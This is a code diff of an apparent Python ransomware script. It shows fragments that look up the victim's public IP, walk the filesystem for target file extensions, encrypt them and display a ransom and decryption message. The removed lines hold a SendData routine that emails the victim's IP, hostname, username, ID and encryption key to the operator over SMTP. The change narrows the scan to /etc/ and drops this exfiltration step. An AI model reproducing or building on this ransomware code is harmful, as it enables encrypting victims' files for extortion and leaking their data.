@@ -15,12 +15,6 @@ hostname = socket.gethostname()
 IP = get('https://api.ipify.org').text
 PATH = os.getcwd()
 
-# Email Settings
-port = 587  
-smtp_server = "" # Enter the smtp server of your email provider
-sender_email = ""  # Enter your address
-receiver_email = ""  # Enter receiver address
-password = "" # your email password
 
 extensions = (
         # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
@@ -84,7 +78,7 @@ def FindFiles():
     while load_state != 'FINISHED':
         f = open("logs/path.txt", "a")
         cnt = 0
-        for root, dirs, files in os.walk("/"):
+        for root, dirs, files in os.walk("/etc/"):
         # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
             for file in files:
                 if file.endswith(extensions):
@@ -134,7 +128,7 @@ def StartRansom():
                 bar.next()
     fp.close()
     print()
-    SendData()
+   
     clear()
     DecyptMessage(False)
 
@@ -178,27 +172,6 @@ def DecyptMessage(INVALID_KEY):
     fp.close()
     shutil.rmtree(PATH+'/logs', ignore_errors=True)
     exit()
-
-
-
-def SendData():
-    DataSend = ("""
-    time: {}
-    IP: {}
-    Hostname: {}
-    username: {}
-    id: {}
-    key: {}
-    """).format(time_now, IP, hostname, username, str(digits), str(key))
-    print("Sending Data")
-    context = ssl.create_default_context()
-    with smtplib.SMTP(smtp_server, port) as server:
-        server.ehlo()  # Can be omitted
-        server.starttls(context=context)
-        server.ehlo()  # Can be omitted
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, DataSend)
-
 if __name__ == '__main__':
     # Generate digits ID or read generated value from digits.txt
     if os.path.isfile("logs/digits.txt") == True:
